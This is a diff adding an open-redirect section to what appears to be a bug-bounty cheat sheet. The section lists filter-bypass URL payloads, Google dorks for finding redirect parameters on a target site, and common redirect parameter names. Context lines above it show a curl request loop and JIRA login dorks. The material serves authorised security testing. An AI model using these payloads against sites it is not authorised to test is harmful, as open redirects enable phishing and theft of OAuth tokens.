@@ -148,3 +148,41 @@ for i in {1..100}; do curl 'https://abc.com/graphql'  -H 'user-agent: Mozilla/5.
 inurl:companyname intitle:JIRA login
 inurl:visma intitle:JIRA login
 ```
+## Open Redirect Bypass
+### Payloads
+```text
+https:www.google.com
+HtTp://google.com
+http\x3A\x2F\x2Fgoogle.com
+//google。com
+x00http://google.com
+////216.58.214.206
+/\216.58.214.206
+x20http://www.google.com
+https://www.google.com
+hthttp://tp://www.google.com
+。/www.google.com
+```
+### Dorks & Parameter Names
+```text
+site:target.com AND inurl:url=http(s)
+site:target.com AND inurl:u=http(s)
+site:target.com AND inurl:redirect?http(s)
+site:target.com AND inurl:redirect=http(s)
+site:target.com AND inurl:link=http(s)
+```
+***Some parameter names that need attention while looking for Open Redirects:***
+```text
+?next=
+?url=
+?dest=
+?redirect=
+?returnTo=
+?go=
+?redirect_uri
+?continue=
+?return_path=
+?externalLink=
+?URL=
+```
+
